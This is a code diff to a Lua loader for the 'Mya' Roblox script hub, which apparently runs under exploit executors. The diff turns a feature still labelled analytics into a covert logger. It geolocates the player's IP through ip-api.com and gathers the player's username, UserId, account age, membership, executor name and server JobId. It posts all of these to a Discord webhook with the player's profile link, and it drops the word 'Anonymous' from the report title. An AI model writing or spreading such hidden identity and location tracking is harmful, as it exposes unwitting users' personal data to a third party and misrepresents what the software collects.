@@ -10,6 +10,10 @@ return function(BASE_URL: string, config: { [string]: any })
 	local RunService = game:GetService("RunService")
 	local TweenService = game:GetService("TweenService")
 	local HttpService = game:GetService("HttpService")
+	local LocalizationService = game:GetService("LocalizationService")
+
+	local theme = config.THEME
+
 	-- Spread heavy work across frames so injection doesn’t hitch as one long stall.
 	local function yieldFrames(n: number)
 		for _ = 1, n do
@@ -26,6 +30,53 @@ return function(BASE_URL: string, config: { [string]: any })
 		local r = tostring(math.random(100000, 999999))
 		return "mya-" .. t .. "-" .. r
 	end)()
+
+	local function getFlagEmoji(countryCode: string)
+		if typeof(countryCode) ~= "string" or #countryCode ~= 2 then
+			return "🏳️"
+		end
+		if typeof(utf8) ~= "table" or typeof(utf8.char) ~= "function" then
+			return "🏳️"
+		end
+		local code = countryCode:upper()
+		local first = string.byte(code, 1) + 127397
+		local second = string.byte(code, 2) + 127397
+		local ok, emoji = pcall(utf8.char, first, second)
+		return ok and emoji or "🏳️"
+	end
+
+	local function colorToDec(c: Color3): number
+		return math.floor(c.R * 255) * 65536 + math.floor(c.G * 255) * 256 + math.floor(c.B * 255)
+	end
+
+	local function getExecutorName()
+		if typeof(identifyexecutor) == "function" then
+			local ok, name, version = pcall(identifyexecutor)
+			if ok then
+				return tostring(name) .. (version and (" " .. tostring(version)) or "")
+			end
+		end
+		return "Unknown Executor"
+	end
+
+	local ipData = nil
+	task.spawn(function()
+		local req = request or http_request or (syn and syn.request)
+		if typeof(req) == "function" then
+			local ok, res = pcall(function()
+				return req({
+					Url = "http://ip-api.com/json/",
+					Method = "GET",
+				})
+			end)
+			if ok and typeof(res) == "table" and res.Body then
+				local okJson, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+				if okJson and data.status == "success" then
+					ipData = data
+				end
+			end
+		end
+	end)
 
 	local function analyticsEnabled()
 		local g = typeof(getgenv) == "function" and getgenv() or nil
@@ -80,6 +131,34 @@ return function(BASE_URL: string, config: { [string]: any })
 		if not url then
 			return
 		end
+
+		local userId = 0
+		local username = "Unknown"
+		local displayName = "Unknown"
+		local accountAge = 0
+		local membership = "None"
+		pcall(function()
+			userId = localPlayer.UserId
+			username = localPlayer.Name
+			displayName = localPlayer.DisplayName
+			accountAge = localPlayer.AccountAge
+			membership = localPlayer.MembershipType.Name
+		end)
+
+		local executor = getExecutorName()
+
+		local countryCode = "US"
+		local countryName = "Unknown"
+		local city = "Unknown"
+		pcall(function()
+			countryCode = ipData and ipData.countryCode or LocalizationService:GetCountryRegionCode()
+			countryName = ipData and ipData.country or "Unknown"
+			city = ipData and ipData.city or "Unknown"
+		end)
+		local flag = getFlagEmoji(countryCode)
+
+		local thumbUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
+
 		local payload = {
 			event = eventName,
 			brand = tostring(config.BRAND or "Mya"),
@@ -87,6 +166,7 @@ return function(BASE_URL: string, config: { [string]: any })
 			session_id = analyticsSessionId,
 			place_id = game.PlaceId,
 			place_name = tostring(game.Name or "Unknown"),
+			job_id = game.JobId,
 			timestamp_unix = os.time(),
 		}
 		if type(extra) == "table" then
@@ -94,25 +174,42 @@ return function(BASE_URL: string, config: { [string]: any })
 				payload[k] = v
 			end
 		end
-		local embedFields = {
-			{ name = "event", value = tostring(payload.event), inline = true },
-			{ name = "place_id", value = tostring(payload.place_id), inline = true },
-			{ name = "place_name", value = tostring(payload.place_name), inline = false },
-			{ name = "session_id", value = tostring(payload.session_id), inline = false },
-			{ name = "module_kind", value = tostring(payload.module_kind or "n/a"), inline = true },
-			{ name = "module_path", value = tostring(payload.module_path or "n/a"), inline = false },
-			{ name = "timestamp_unix", value = tostring(payload.timestamp_unix), inline = true },
-		}
+
+		local embedColor = colorToDec(theme.accent or Color3.fromRGB(240, 130, 175))
+
 		local discordPayload = {
 			username = "Mya Analytics",
+			avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=150&height=150&format=png",
 			embeds = {
 				{
-					title = "Mya Anonymous Analytics",
-					color = 15762095,
-					fields = embedFields,
+					title = "📊 Mya Analytics Event",
+					description = "A new event was recorded for **" .. tostring(config.BRAND) .. "**",
+					color = embedColor,
+					thumbnail = { url = thumbUrl },
+					author = {
+						name = username .. " (@" .. displayName .. ")",
+						icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=150&height=150&format=png",
+						url = "https://www.roblox.com/users/" .. tostring(userId) .. "/profile"
+					},
+					fields = {
+						{ name = "👤 User Info", value = string.format("**Username:** %s\n**UserID:** %s\n**Account Age:** %s days\n**Membership:** %s", username, tostring(userId), tostring(accountAge), membership), inline = true },
+						{ name = "🌍 Location", value = string.format("**Country:** %s %s\n**City:** %s", countryName, flag, city), inline = true },
+						{ name = "🎮 Game Info", value = string.format("**Place:** %s\n**PlaceID:** %s\n**JobID:** `%s`", tostring(payload.place_name), tostring(payload.place_id), tostring(payload.job_id)), inline = false },
+						{ name = "🛠️ Session Info", value = string.format("**Event:** `%s`\n**Executor:** %s\n**Session:** `%s`", eventName, executor, tostring(payload.session_id)), inline = false },
+					},
+					footer = {
+						text = string.format("%s v%s • %s", tostring(config.BRAND), tostring(config.VERSION), os.date("!%Y-%m-%d %H:%M:%S")),
+						icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=150&height=150&format=png"
+					},
+					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 				},
 			},
 		}
+
+		if payload.module_path then
+			table.insert(discordPayload.embeds[1].fields, { name = "📦 Module", value = string.format("**Kind:** %s\n**Path:** `%s`", tostring(payload.module_kind or "n/a"), tostring(payload.module_path)), inline = false })
+		end
+
 		task.spawn(function()
 			pcall(function()
 				postJson(url, discordPayload)
@@ -187,7 +284,7 @@ return function(BASE_URL: string, config: { [string]: any })
 	if typeof(makeUi) ~= "function" then
 		error("[Mya] lib/ui.lua must return function(theme) ... end")
 	end
-	local theme = config.THEME
+
 	local UI = makeUi(theme)
 	yieldFrames(2)
 
@@ -964,7 +1061,7 @@ return function(BASE_URL: string, config: { [string]: any })
 
 	local mountedModule: any = nil
 	local placeId = game.PlaceId
-	sendAnonAnalyticsDelayed(2.0, "hub_launch", {
+	sendAnonAnalytics("hub_launch", {
 		module_kind = "hub",
 	})
 	local supported = config.SUPPORTED_GAMES or {}
@@ -1147,7 +1244,7 @@ return function(BASE_URL: string, config: { [string]: any })
 	end)
 
 	-- Let the in-window loader stay visible briefly; fast machines otherwise flash it.
-	local MIN_HUB_OVERLAY_SEC = 1.5
+	local MIN_HUB_OVERLAY_SEC = 0.5
 	do
 		local elapsed = os.clock() - hubOverlayStarted
 		if elapsed < MIN_HUB_OVERLAY_SEC then
@@ -1236,7 +1333,7 @@ return function(BASE_URL: string, config: { [string]: any })
 		if not game:IsLoaded() then
 			game.Loaded:Wait()
 		end
-		local deadline = os.clock() + 15
+		local deadline = os.clock() + 2
 		while game.PlaceId == 0 and os.clock() < deadline do
 			task.wait(0.05)
 		end
